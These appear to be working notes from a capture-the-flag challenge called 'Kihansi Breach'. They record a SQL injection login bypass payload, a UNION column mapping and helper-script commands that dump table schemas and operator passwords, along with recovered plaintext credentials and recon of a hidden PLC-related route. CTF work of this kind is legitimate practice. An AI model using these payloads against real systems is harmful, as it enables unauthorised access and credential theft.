# Kihansi Breach - Easy Reference

## Target
- Previous: `http://209.38.92.205:33132`
- Current: `http://209.38.92.205:33135`
- Flag format: `GoH{...}`

## Confirmed Vulnerability
- `POST /login` is SQL injectable (auth bypass + UNION exfiltration)

## Auth Bypass Payload
```text
username=' or '1'='1
password=' or '1'='1
```
Expected: `302 /dashboard`

## UNION Shape (Important)
- Working UNION column count: `7`

## UNION->Session Mapping
- col1 -> `user_id`
- col2 -> `username` (best exfil field)
- col4 -> `full_name`
- col5 -> `role`
- col7 -> `badge_id`

## Fast SQLi Helper
- Script: `kihansi_breach/sqli_helper.py`

### Examples
```bash
python3 kihansi_breach/sqli_helper.py --expr "sqlite_version()"
python3 kihansi_breach/sqli_helper.py --expr "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table')"
python3 kihansi_breach/sqli_helper.py --expr "(SELECT group_concat(name||':'||type,'|') FROM pragma_table_info('operators'))"
python3 kihansi_breach/sqli_helper.py --expr "(SELECT group_concat(id||':'||username||':'||password,'||') FROM operators)"
```

## High-Value Extracted Data

### SQLite fingerprint
- Version: `3.46.1`
- DB file: `/tmp/tanzagrid.db`
- Tables: `operators`, `sqlite_sequence`, `event_log`

### Valid credentials recovered
- `admin : TGP@dm1n2024`
- `ops.monitor : OpsM0n!24`
- plus all other operator accounts (see full README)

### Admin login
```text
username=admin
password=TGP@dm1n2024
```
Works, but no additional visible admin-only routes found.

## Hidden Route Found
- `/engineering` (comment leak from dashboard)

## /engineering/read Behavior
- Non-integer input -> `Invalid input`
- Address out of `[0,9900]` -> `Address out of range`
- Valid integer inputs -> mostly `PLC communication failure`

## What Was Checked (No Flag Yet)
- All DB table data (`operators`, `event_log`)
- Raw page keyword scans via `sqlite_dbpage`
- Route guesses + basic authenticated fuzzing attempts
- Admin/monitor account behavior differences

## Current Best Next Moves
1. Find undiscovered endpoint not in current templates.
2. Get a successful non-failure response from `/engineering/read` (PLC backend path).
3. Explore non-DB flag storage path exposed indirectly by app logic.

## New Instance Continuation Notes (33135)
- SQLi on `/login` still works identically (same 7-column UNION behavior).
- `operators`/`event_log` data appears unchanged from prior run.
- `/engineering/read` still returns only:
  - `PLC communication failure` (valid range)
  - `Address out of range` (invalid range)
- Admin-context route fuzzing on `33135` found no new hidden endpoints.
- Raw `sqlite_dbpage` re-check still found no `GoH{...}` marker.
